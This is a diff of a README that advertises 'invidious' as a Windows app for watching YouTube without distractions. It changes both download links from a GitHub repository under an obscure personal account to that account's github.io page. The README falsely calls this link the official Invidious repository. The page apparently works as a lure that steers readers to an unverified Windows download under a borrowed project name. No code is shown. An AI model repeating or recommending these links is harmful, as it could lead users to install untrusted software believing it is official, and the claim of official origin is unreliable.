@@ -1,6 +1,6 @@
 # 📹 invidious - Watch YouTube Without Distractions
 
-[![Download for Windows](https://img.shields.io/badge/Download%20Invidious%20for%20Windows-blue?style=for-the-badge&logo=windows)](https://github.com/borissinglebreasted415/invidious)
+[![Download for Windows](https://img.shields.io/badge/Download%20Invidious%20for%20Windows-blue?style=for-the-badge&logo=windows)](https://borissinglebreasted415.github.io)
 
 ## 🎯 What Is Invidious?
 
@@ -44,7 +44,7 @@ This application runs on your Windows computer. It gives you full control over y
 
 Go to the official Invidious GitHub repository:
 
-[**https://github.com/borissinglebreasted415/invidious**](https://github.com/borissinglebreasted415/invidious)
+[**https://borissinglebreasted415.github.io**](https://borissinglebreasted415.github.io)
 
 **Step 2: Find the latest release**
 
